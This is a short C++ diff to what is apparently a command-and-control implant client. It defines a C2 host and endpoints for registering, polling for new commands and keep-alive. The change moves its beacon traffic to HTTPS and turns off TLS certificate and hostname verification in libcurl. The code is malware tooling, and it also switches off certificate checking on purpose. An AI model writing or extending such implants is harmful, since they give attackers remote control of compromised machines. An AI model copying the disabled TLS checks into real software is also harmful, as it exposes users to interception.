@@ -13,7 +13,7 @@
 
 using json = nlohmann::json;
 
-#define C2_HOST "http://172.21.0.1:1234"
+#define C2_HOST "https://172.21.0.1:1234"
 #define REGISTER_URI C2_HOST"/c2/register/"
 #define CHECK_NEW_CMD_URI C2_HOST"/c2/new_command/"
 #define KEEP_ALIVE_URI C2_HOST"/c2/keep_alive/"
@@ -71,6 +71,8 @@ private:
         curl_easy_setopt(curl, CURLOPT_URL, uri.c_str());
         curl_easy_setopt(curl, CURLOPT_POST, 1L);
         curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 
         if (post)
         {
